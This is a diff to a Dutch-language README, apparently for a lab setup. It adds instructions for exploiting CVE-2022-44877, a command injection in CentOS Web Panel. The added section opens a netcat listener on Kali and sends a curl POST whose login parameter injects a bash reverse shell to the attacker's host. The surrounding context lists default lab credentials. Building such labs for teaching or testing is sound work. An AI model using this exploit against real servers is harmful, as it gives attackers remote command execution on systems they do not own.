@@ -64,3 +64,21 @@ We hebben ons script zo gemaakt, dat u als gebruiker moet u `enter` doen als de 
 username=almalinux
 
 password=almalinux
+
+# Hoe CVE-2022-44877 uitvoeren
+
+## Open listener op Kali
+
+```bash
+nc -lvnp 4444
+```
+
+## Exploit uitvoeren vanaf Kali
+
+```bash
+curl -X POST "http://TARGET_IP:2031/login/index.php?login=$(bash -i >& /dev/tcp/KALI_IP/4444 0>&1)" \
+  -d "username=root" \
+  -d "password=toor" \
+  -d "commit=Login" \
+  -s -o /dev/null
+```
